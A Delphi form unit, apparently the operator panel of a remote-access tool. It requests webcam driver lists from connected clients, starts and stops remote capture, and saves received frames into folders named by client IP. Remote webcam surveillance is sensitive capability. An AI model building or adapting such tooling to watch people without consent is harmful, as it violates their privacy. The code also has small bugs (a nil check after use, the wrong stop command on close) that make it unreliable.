unit UnitWebcam;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, Spin, ExtCtrls, UnitConnection, UnitUtils, UnitCommands,
  ZLibEx, jpeg;

type
  TFormWebcam = class(TForm)
    img1: TImage;
    pb1: TProgressBar;
    pnl1: TPanel;
    lbl1: TLabel;
    lbl2: TLabel;
    btn1: TButton;
    trckbrQuality: TTrackBar;
    seInterval: TSpinEdit;
    chk1: TCheckBox;
    stat1: TStatusBar;
    cbbDrivers: TComboBoxEx;
    lbl3: TLabel;
    lbl4: TLabel;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure trckbrQualityChange(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    ClientDatas: TClientDatas;                              
    procedure OnClientRead(Datas: string);
    procedure OnStreamTransfer(Sender: TObject; Transfered: Integer);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _ClientDatas: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormWebcam: TFormWebcam;

implementation

{$R *.dfm}
                 
constructor TFormWebcam.Create(aOwner: TComponent; _ClientDatas: TClientDatas);
begin
  inherited Create(aOwner);
  ClientDatas := _ClientDatas;
end;

procedure TFormWebcam.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormWebcam.WndProc(var Msg: TMessage);
begin
  inherited;
  if Msg.Msg = WM_USER + 12 then OnClientRead(string(Msg.WParam));
end;

procedure TFormWebcam.OnStreamTransfer(Sender: TObject; Transfered: Integer);
begin
  pb1.Position := pb1.Position + Transfered;
end;

procedure TFormWebcam.OnClientRead(Datas: string);
var
  Cmd, i: Integer;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
  TmpStr: string;
  Stream, TmpStream: TMemoryStream;
begin
  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1));
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_WEBCAM_CAPTURE:
    begin
      pb1.Position := 0;
      pb1.Max := StrToInt(Datas);

      Stream := ClientDatas.ClientSocket.RecvStream(StrToInt(Datas), OnStreamTransfer);
      Stream.Position := 0;

      if Stream = nil then Exit;

      //decompress received stream
      TmpStream := TMemoryStream.Create;
      ZDecompressStream(Stream, TmpStream);   
      TmpStream.Position := 0;
      Stream.Free;

      Jpg := TJPEGImage.Create;
      Jpg.LoadFromStream(TmpStream);
      TmpStream.Free;
      Bmp := TBitmap.Create;
      Bmp.Assign(Jpg);
      Jpg.Free;
                
      if chk1.Checked then
      begin
       //create webcam's folder first
        if not DirectoryExists(ExtractFilePath(ParamStr(0)) + 'Webcam') then
          CreateDir(ExtractFilePath(ParamStr(0)) + 'Webcam');

        //and then for the specific client
        TmpStr := ExtractFilePath(ParamStr(0)) + 'Webcam\' + ClientDatas.ClientSocket.RemoteAddress;
        if not DirectoryExists(TmpStr) then CreateDir(TmpStr);

        //save image to file with unique id
        Bmp.SaveToFile(TmpStr + '\' + IntToStr(GetTickCount));
      end;

      img1.Picture.Bitmap.Assign(bmp);
      Bmp.Free;
      
      Application.ProcessMessages;
    end;

    CMD_WEBCAM_DRIVERS:
    begin
      cbbDrivers.Clear;

      while Datas <> '' do
      begin
        TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
        Delete(Datas, 1, Pos('|', Datas));
        cbbDrivers.Items.Add(TmpStr);
      end;
      
      cbbDrivers.ItemIndex := 0; //set first item selected

      if cbbDrivers.Items.Count > 0 then
        stat1.Panels.Items[0].Text := 'Drivers listed successfully!'
      else stat1.Panels.Items[0].Text := 'Drivers not found.';
    end;
    
    CMD_WEBCAM_START:
    begin
      btn1.Caption := 'Stop';
      trckbrQuality.Enabled := False;
      seInterval.Enabled := False;
      stat1.Panels.Items[0].Text := 'Webcam capture started successfully!';
    end;

    CMD_WEBCAM_STOP:
    begin
      btn1.Caption := 'Start';
      trckbrQuality.Enabled := True;
      seInterval.Enabled := True;
      stat1.Panels.Items[0].Text := 'Webcam capture stopped.';
    end;
  end;
end;

procedure TFormWebcam.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if btn1.Caption = 'Stop' then
    ClientDatas.SendDatas(IntToStr(CMD_SCREEN_STOP) + '|'); //stop capture when closing form
end;

procedure TFormWebcam.FormCreate(Sender: TObject);
begin
  //
end;

procedure TFormWebcam.FormShow(Sender: TObject);
begin
  ClientDatas.SendDatas(IntToStr(CMD_WEBCAM_DRIVERS) + '|');
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
  
  //center window
  Left := (Screen.Width - Width) div 2;
  Top := (Screen.Height - Height) div 2;
end;

procedure TFormWebcam.btn1Click(Sender: TObject);
var
  i: Integer;
begin
  i := cbbDrivers.ItemIndex;
  if i = -1 then
  begin
    ShowMessage('No webcam drivers selected.');
    Exit;
  end;

  if btn1.Caption = 'Start' then
  begin
    ClientDatas.SendDatas(IntToStr(CMD_WEBCAM_START) + '|' +  IntToStr(i) + '|' +
      IntToStr(trckbrQuality.Position) + '|' + IntToStr(img1.Width) + '|' + 
      IntToStr(img1.Height) + '|' + seInterval.Text + '|');
  end
  else ClientDatas.SendDatas(IntToStr(CMD_WEBCAM_STOP) + '|');

  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormWebcam.trckbrQualityChange(Sender: TObject);
begin
  lbl4.Caption := IntToStr(trckbrQuality.Position) + ' %';
end;

end.
